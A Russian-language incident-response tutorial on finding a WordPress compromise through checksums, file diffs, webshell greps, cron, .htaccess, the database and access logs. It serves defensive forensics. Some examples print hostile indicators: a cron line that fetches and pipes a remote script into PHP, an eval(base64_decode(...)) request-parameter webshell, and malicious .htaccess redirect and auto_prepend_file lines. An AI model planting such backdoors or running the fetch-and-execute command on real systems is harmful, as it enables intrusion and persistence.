## Вопрос, с которого всё начинается

Сайт на WordPress «сломался» или рассылает спам. Скорее всего, загружен шелл или
изменён плагин. Разберём, где искать следы.

## Наш пример: WordPress

## Шаг 1: версия и компоненты

Уязвимости ищут по версиям ядра и плагинов:

```
$ curl -s http://target/wp-includes/version.php | grep wp_version
$ ls /var/www/html/wp-content/plugins/
```

Устаревший плагин — частый вход.

## Шаг 2: изменённые файлы

Злоумышленник меняет файлы. Сравни с эталоном:

```
$ diff -rq /var/www/html /opt/wordpress-clean/ | grep differ
Files /var/www/html/wp-content/themes/x/functions.php differ
```

`functions.php` с лишним кодом — классика.

## Шаг 3: веб-шеллы

Ищем исполняемые файлы в неожиданных местах:

```
$ find /var/www/html -name '*.php' -newermt '2026-01-14 03:00' | head
```

И подозрительный код:

```
$ grep -rE 'eval\(|base64_decode\(|system\(' /var/www/html/wp-content/uploads/
```

## Шаг 4: пользователи и логины

```
$ wp user list --role=administrator
```

Новый админ-аккаунт — признак компромисса. Сопоставь с логом входов:

```
$ grep 'wp-login' /var/log/apache2/access.log | grep POST | tail
```

## Шаг 5: что искать

- изменённые/новые PHP-файлы;
- шелл-паттерны (`eval`, `base64_decode`);
- новые админы;
- подозрительные запросы (POST на `wp-login`, доступ к `uploads/*.php`);
- устаревшие плагины.

## Шаг 6: wp-config.php и доступ к базе

Центральный файл WordPress — `wp-config.php`. Там учётные данные базы:

```
$ grep -E "DB_NAME|DB_USER|DB_PASSWORD" /var/www/html/wp-config.php
define('DB_NAME', 'wordpress');
define('DB_USER', 'wpuser');
define('DB_PASSWORD', '...');
```

Атакующий, получив доступ к файлам, первым делом читает этот файл. Если в логах есть запрос к `wp-config.php` извне — это попытка украсть доступ к базе.

## Шаг 7: cron и планировщик

Веб-шеллы часто закрепляются через cron:

```
$ crontab -l
*/5 * * * * curl -s http://203.0.113.5/cron.php | php
$ ls /var/spool/cron/crontabs/
```

Задание, которое каждые 5 минут подтягивает скрипт извне, — классический бэкдор. В расследовании cron проверяют в первую очередь: он объясняет, почему вредоносная активность возвращается после чистки.

## Шаг 8: база данных

В базе — пользователи и опции:

```
$ wp db query "SELECT user_login,user_email FROM wp_users;"
$ wp option get siteurl
```

Незнакомый пользователь или изменённый `siteurl` — след. В `wp_options` иногда остаются автозагружаемые записи, добавленные шеллом.

## Шаг 9: восстановление по логам

Собираем хронологию:

```
$ grep ' 200 ' /var/log/apache2/access.log | grep -iE '\.php' | tail
```

Фиксируем первый подозрительный запрос (обычно POST с полезной нагрузкой), затем — обращения к загруженному файлу. Это даёт время и способ проникновения.

## Шаг 10: что искать

- `wp-config.php` — доступ к базе;
- cron/планировщик — закрепление;
- записи в `wp_users`/`wp_options`;
- первый вредоносный запрос в логах;
- изменённые файлы ядра/тем.

## Шаг 11: проверка целостности ядра

WordPress умеет сверять файлы ядра с официальными хэшами:

```
$ wp core verify-checksums
Warning: File doesn't verify against checksum: wp-includes/functions.php
```

Любое расхождение — изменённый файл. Этот способ надёжнее «на глаз», потому что сравнивает с эталоном самой CMS, а не с чьей-то копией.

## Шаг 12: .htaccess и скрытые редиректы

Атакующие часто правят `.htaccess` — он управляет поведением Apache:

```
$ cat /var/www/html/.htaccess
RewriteRule ^go$ http://203.0.113.5/landing [R=302,L]
php_value auto_prepend_file /tmp/x.php
```

`RewriteRule` прячет редиректы (SEO-спам, фишинг), а `auto_prepend_file` заставляет выполнять чужой PHP перед каждым запросом. Обе конструкции — явные индикаторы.

## Шаг 13: хронология по логам

Собираем события по времени доступа:

```
$ awk '{print $4, $6, $7}' access.log | grep -iE 'wp-login|\.php' | tail
```

Первый POST на `wp-login.php` — попытка входа; всплеск POST — брутфорс; затем запрос к файлу в `uploads` — запуск шелла. Так выстраивается цепочка «вход → загрузка → выполнение».

## Шаг 14: практический итог

Порядок разбора CMS-инцидента:

1. сверить ядро (`wp core verify-checksums`);
2. найти новые/изменённые файлы в темах и плагинах;
3. проверить `.htaccess` и cron;
4. посмотреть пользователей и опции в базе;
5. восстановить хронологию по логам.

Так мы находим и точку входа, и механизм закрепления, и то, что успели сделать.

## Практика: разбор взломанного сайта

Сайт рассылает спам. Идём по шагам.

Сверяем ядро:

```
$ wp core verify-checksums
Warning: File doesn't verify against checksum: wp-includes/class-wp.php
```

Ядро изменено. Смотрим, что там лишнее:

```
$ tail -c 400 wp-includes/class-wp.php
if(isset($_REQUEST['c'])){eval(base64_decode($_REQUEST['c']));}
```

Классический шелл: принимает код из параметра и выполняет его.

Теперь ищем точку входа в логах:

```
$ grep -E 'POST .*class-wp\.php' access.log | head
203.0.113.5 - - [14/Jan/2026:03:12:01] "POST /wp-includes/class-wp.php HTTP/1.1" 200
```

Первый POST на изменённый файл — момент активации. До него обычно есть запрос, который **загрузил** изменение (через уязвимый плагин):

```
$ grep -E 'POST .*(plugin|upload)' access.log | head
```

Сопоставляем версию плагина с известными уязвимостями — находим метод проникновения.

Затем проверяем закрепление:

```
$ crontab -l
$ wp user list --role=administrator
```

Находим задание cron и нового админа. Собираем всё в хронологию: уязвимый плагин → загрузка шелла → активация → закрепление.

## Что важно

- `verify-checksums` находит изменённое ядро.
- Шелл читается по `eval(base64_decode(...))`.
- Логи дают момент активации и путь проникновения.
- Cron и новые админы — закрепление.

## Если защита мешает

Реальный сайт редко бывает «чистым». Разберём, что мешает и как это обойти при разборе.

**WAF перед сайтом.** Логи веб-сервера могут быть неполными, если фильтр отсекает запросы раньше. Тогда смотри логи самого WAF/CDN — там видны заблокированные попытки, по которым восстанавливают активность.

**Шелл обфусцирован.** Вместо читаемого `eval(base64_decode(...))` может быть многослойная упаковка. Раскручивай её в CyberChef или `php -r`, но делай это на копии, в изолированной среде.

**Шелл только в базе.** Иногда код не в файлах, а в записи `wp_options` (например, через автозагружаемую опцию). Тогда проверка целостности ядра ничего не найдёт — обязателен анализ базы.

**Очищенные логи.** Если логи усечены, восстанови события из ротации (`.1`, `.gz`) и из журналов на других узлах.

**Эталон устарел.** Чистая копия CMS должна быть той же версии. Иначе diff покажет различия обновления, а не взлома.

Правило: подтверждай каждую находку вторым источником — файл, база, лог. Совпадение делает вывод доказательным.

## Что мы теперь знаем

- Версии ядра/плагинов — вектор.
- Изменённые файлы ловятся сравнением с эталоном.
- Шеллы ищут по времени и паттернам.
- Новый админ — признак компромисса.
- Логи показывают входы и запросы.

- `wp-config.php` содержит креды базы.
- Cron — частое место закрепления шелла.
- База показывает новых пользователей и изменения.
- Логи дают хронологию проникновения.
- Ядро и темы сверяем с эталоном.

- `wp core verify-checksums` сверяет ядро с эталоном.
- `.htaccess` прячет редиректы и подключает чужой PHP.
- Хронология по логам: вход → загрузка → выполнение.
- Порядок: ядро → файлы → .htaccess/cron → база → логи.

## Если не сработало

- Нет эталона? Скачай чистую версию CMS.
- Шелл обфусцирован? Ищи кодировки и eval.
- Нужен доступ? Проверь cron и wp-config.php.
